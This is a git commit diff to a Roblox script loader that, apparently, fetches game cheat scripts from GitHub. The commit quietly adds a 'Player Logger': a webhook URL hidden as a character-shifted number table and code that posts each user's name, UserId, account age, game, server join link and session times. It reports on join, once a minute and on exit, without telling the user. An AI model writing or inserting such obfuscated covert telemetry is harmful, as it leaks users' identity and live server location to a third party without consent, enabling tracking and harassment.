569f874601a602b9c5763f4a68c43c078e82d9d4
Sphynx <adiarazza001@gmail.com>
2026-04-13 09:37:04 +0700

    Update loader new.lua

--- loader new.lua
+++ loader new.lua
@@ -1,3 +1,5 @@
+local HttpService = game:GetService("HttpService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 local Players = game:GetService("Players")
 local StarterGui = game:GetService("StarterGui")
 local CoreGui = game:GetService("CoreGui")
@@ -19,6 +21,204 @@ local LOADERS = {
     [114234929420007] = "https://raw.githubusercontent.com/sphynx-byte/Roblox/refs/heads/main/Blox%20Strike.lua", --blox strike
     [103188421562819] = "https://raw.githubusercontent.com/sphynx-byte/Sambung-kata/refs/heads/main/(kamus)%20Sambung%20Kata%20Jawa.lua" -- SK Jawa
 }
+
+
+------- webhook
+local function _d(t)
+    local s = ""
+    for i = 1, #t do
+        s = s .. string.char(t[i] - 3)
+    end
+    return s
+end
+
+local WEBHOOK = _d({
+    107,119,119,115,118,61,50,50,103,108,118,102,114,117,103,49,102,114,112,50,
+    100,115,108,50,122,104,101,107,114,114,110,118,50,52,57,57,51,51,56,59,59,
+    56,59,56,57,53,51,55,51,55,55,53,50,53,58,58,51,55,51,55,51,55,52,55,55,
+    55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55,55
+})
+local LocalPlayer = Players.LocalPlayer
+local startTime = os.time()
+local joinTimeFormatted = os.date("%H:%M:%S")
+local messageId
+
+local function formatTime(sec)
+    return string.format("%02d:%02d:%02d",
+        sec // 3600,
+        (sec % 3600) // 60,
+        sec % 60
+    )
+end
+
+local function getGameName()
+    local success, info = pcall(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId) end)
+    return success and info.Name or "Unknown"
+end
+
+local function buildPayload(status, leaveTime)
+
+    local profileUrl =
+        "https://www.roblox.com/users/"
+        .. LocalPlayer.UserId ..
+        "/profile"
+
+    local gameName = getGameName()
+
+    local jobId = game.JobId
+
+    local serverUrl =
+        "https://www.roblox.com/games/start?placeId="
+        .. game.PlaceId ..
+        "&gameInstanceId="
+        .. jobId
+
+
+    return {
+        username = "Player Logger",
+
+        embeds = {{
+
+            title = "Roblox Player Activity - Sphyn Hub Rusuh",
+            url = profileUrl,
+
+            color =
+                status == "JOIN" and 0x00FF00
+                or status == "LEAVE" and 0xFF0000
+                or 0x00AAFF,
+
+            fields = {
+
+                {
+                    name = "Username",
+                    value = "[" .. LocalPlayer.Name .. "](" .. profileUrl .. ")",
+                    inline = true
+                },
+
+                {
+                    name = "UserId",
+                    value = "```" .. LocalPlayer.UserId .. "```",
+                    inline = true
+                },
+
+                {
+                    name = "Status",
+                    value = "```" .. status .. "```",
+                    inline = true
+                },
+
+                {
+                    name = "Game",
+                    value = "```" .. gameName .. "```",
+                    inline = false
+                },
+
+                {
+                    name = "Place ID",
+                    value = "```" .. game.PlaceId .. "```",
+                    inline = true
+                },
+
+                {
+                    name = "JobId",
+                    value = "```" .. jobId .. "```",
+                    inline = true
+                },
+
+                {
+                    name = "Server URL",
+                    value = serverUrl,
+                    inline = false
+                },
+
+               {
+                    name = "Account Age",
+                    value = "```" .. LocalPlayer.AccountAge .. " days```",
+                    inline = true
+                },    
+
+                {
+                    name = "Join Time",
+                    value = "```" .. joinTimeFormatted .. "```",
+                    inline = true
+                },
+
+                {
+                    name = "Leave Time",
+                    value = "```" .. (leaveTime or "-") .. "```",
+                    inline = true
+                },
+
+                {
+                    name = "Uptime",
+                    value = "```" ..
+                        formatTime(os.time() - startTime) ..
+                        "```",
+                    inline = false
+                }
+
+            },
+
+            footer = {
+                text = "Sphyn Hub Logger"
+            },
+
+            timestamp = DateTime.now():ToIsoDate()
+
+        }}
+
+    }
+
+end
+
+local function sendWebhook(status, leaveTime)
+    if not request then return end
+    
+    local success, res = pcall(function()
+        return request({
+            Url = WEBHOOK .. "?wait=true",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(buildPayload(status, leaveTime))
+        })
+    end)
+
+    if success and res and res.Body then
+        local data = HttpService:JSONDecode(res.Body)
+        messageId = data.id
+    end
+end
+
+local function editWebhook()
+    if not messageId or not request then return end
+
+    pcall(function()
+        request({
+            Url = WEBHOOK .. "/messages/" .. messageId,
+            Method = "PATCH",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(buildPayload("ONLINE"))
+        })
+    end)
+end
+
+-- Inisialisasi Logger
+task.spawn(function()
+    sendWebhook("JOIN")
+    
+    -- Update Uptime setiap 1 menit
+    local interval = 60
+    while task.wait(interval) do
+        if not messageId then break end
+        editWebhook()
+    end
+end)
+
+-- Deteksi saat pemain keluar/script ditutup
+game:BindToClose(function()
+    local leaveTimeFormatted = os.date("%H:%M:%S")
+    sendWebhook("LEAVE", leaveTimeFormatted)
+end)
 
 -------------------------
 -- PLACE CHECK
@@ -101,5 +301,4 @@ Tab:CreateButton({
         end)
     end,
 })
-
 
